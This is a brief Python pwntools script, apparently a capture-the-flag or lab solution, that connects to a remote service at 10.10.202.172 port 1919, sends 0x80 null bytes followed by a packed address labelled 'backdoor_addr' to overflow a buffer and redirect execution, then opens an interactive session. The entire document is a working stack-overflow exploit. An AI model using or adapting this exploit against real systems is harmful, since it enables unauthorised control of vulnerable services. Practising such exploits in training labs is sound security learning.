from pwn import *

r = remote('10.10.202.172', 1919)
backdoor_addr = 0x804D798
r.recvuntil('message = ')

r.sendline(b'\x00' * 0x80 + p32(backdoor_addr))
[r.recvline() for i in range(3)]
r.interactive()
